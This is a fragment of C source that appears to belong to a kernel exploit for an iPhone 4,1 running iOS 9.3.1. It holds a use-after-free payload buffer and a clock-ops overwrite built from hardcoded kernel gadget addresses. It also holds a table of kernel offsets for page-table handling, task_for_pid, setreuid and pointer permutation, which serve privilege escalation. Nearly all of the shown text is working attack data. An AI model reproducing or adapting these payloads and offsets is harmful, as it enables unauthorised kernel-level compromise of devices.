...
static uint8_t clock_ops_overwrite[] = {
	0x2d, 0x81, 0x31, 0x00, // [00] (rtclock.getattr): address of OSSerializer::serialize (+1)
...
static uint8_t uaf_payload_buffer[] = {
	...
	0x2d, 0x81, 0x31, 0x00, // [10] address of OSSerializer::serialize (+1)
	0x4a, 0x98, 0x0d, 0x00, // [14] address of "BX LR" code fragment
	0x00, 0x00, 0x00, 0x00, // [18] NULL
	0x35, 0xa9, 0x31, 0x00, // [1C] address of OSSymbol::getMetaClass (+1)
...
static uint32_t addresses_pool[] = {
	...
	0x003f6454, // PMAP
	0x000bc250, // FLUSH_DCACHE
	0x000c7440, // INVALIDATE_TLB
	0x002fcc8c, // TFP
	0x002a977c, // SETREUID
	0x0031812d, // SERIALIZE
	0x00455848, // ADDRPERM
};
...
void target_iphone_4_1_ios_9_3_1_init(target_t *t)
{
